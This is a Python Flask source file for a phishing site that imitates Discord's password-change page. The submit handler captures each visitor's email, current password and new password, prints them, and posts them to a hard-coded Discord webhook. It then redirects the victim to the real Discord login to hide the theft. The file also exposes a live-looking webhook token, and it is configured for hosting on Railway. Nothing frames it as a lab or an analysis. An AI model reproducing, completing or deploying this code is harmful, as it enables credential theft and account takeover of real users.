from flask import Flask, render_template_string, request, redirect
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1550904148114014303/cD5qBuxH86T3NZghaui-dJoeXsJN2V5NHtpOlLZn79RcGrjMKfhXCij3Sj9J9tfD-LgG"

RESET_PAGE = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
    background: linear-gradient(135deg, #5865F2 0%, #404EED 50%, #202225 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    overflow: hidden;
  }
  .stars {
    position: absolute;
    width: 100%;
    height: 100%;
    background-image: 
      radial-gradient(2px 2px at 20% 30%, rgba(255,255,255,0.7), transparent),
      radial-gradient(2px 2px at 60% 70%, rgba(255,255,255,0.5), transparent),
      radial-gradient(1px 1px at 50% 50%, rgba(255,255,255,0.6), transparent),
      radial-gradient(1px 1px at 80% 10%, rgba(255,255,255,0.4), transparent),
      radial-gradient(2px 2px at 90% 60%, rgba(255,255,255,0.5), transparent);
    background-size: 200px 200px;
    opacity: 0.6;
    pointer-events: none;
  }
  .card {
    background: #1E1F22;
    border-radius: 8px;
    padding: 32px;
    width: 100%;
    max-width: 420px;
    text-align: center;
    position: relative;
    z-index: 1;
    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
  }
  h1 {
    color: #FFFFFF;
    font-size: 22px;
    font-weight: 600;
    margin-bottom: 24px;
  }
  label {
    display: block;
    text-align: left;
    color: #B5BAC1;
    font-size: 13px;
    font-weight: 600;
    margin-bottom: 6px;
    margin-top: 16px;
  }
  label span { color: #ED4245; }
  input {
    width: 100%;
    padding: 10px 12px;
    background: #313338;
    border: 1px solid #1E1F22;
    border-radius: 3px;
    color: #DBDEE1;
    font-size: 15px;
    outline: none;
    transition: border 0.2s;
  }
  input:focus {
    border-color: #5865F2;
  }
  button {
    width: 100%;
    padding: 12px;
    background: #5865F2;
    color: #FFFFFF;
    border: none;
    border-radius: 3px;
    font-size: 15px;
    font-weight: 500;
    cursor: pointer;
    margin-top: 24px;
    transition: background 0.2s;
  }
  button:hover {
    background: #4752C4;
  }
</style>
</head>
<body>
  <div class="stars"></div>
  <div class="card">
    <h1>Change Your Password</h1>
    <form method="POST" action="/submit">
      <label>Email / Gmail <span>*</span></label>
      <input type="email" name="email" required placeholder="example@gmail.com">
      
      <label>Current Password <span>*</span></label>
      <input type="password" name="current_pass" required placeholder="Your current password">
      
      <label>New Password <span>*</span></label>
      <input type="password" name="new_pass" required placeholder="Enter new password">
      
      <button type="submit">Change Password</button>
    </form>
  </div>
</body>
</html>
"""

@app.route('/')
@app.route('/reset')
def show_reset():
    return render_template_string(RESET_PAGE)

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get("email", "WALA")
    current_pass = request.form.get("current_pass", "WALA")
    new_pass = request.form.get("new_pass", "WALA")

    print("=" * 60)
    print(f"📧 Email:         {email}")
    print(f"🔒 Current Pass:  {current_pass}")
    print(f"🔑 New Password:  {new_pass}")
    print("=" * 60)

    payload = {
        "embeds": [{
            "color": 0x5865F2,
            "title": "🔑 Password Change — FULL DETAILS",
            "fields": [
                {"name": "📧 Email / Gmail", "value": f"`{email}`", "inline": False},
                {"name": "🔒 Current / Old Password", "value": f"`{current_pass}`", "inline": False},
                {"name": "🔑 New Password", "value": f"`{new_pass}`", "inline": False}
            ]
        }]
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
        print("✅ NAIPADALA SA DISCORD!")
    except Exception as e:
        print(f"❌ Error: {e}")

    return redirect("https://discord.com/login", code=302)

if __name__ == "__main__":
    PORT = int(os.environ.get("PORT", 5000))
    print("=" * 60)
    print(f"✅ READY — Railway mode, Port: {PORT}")
    print("=" * 60)
    app.run(host="0.0.0.0", port=PORT, debug=False)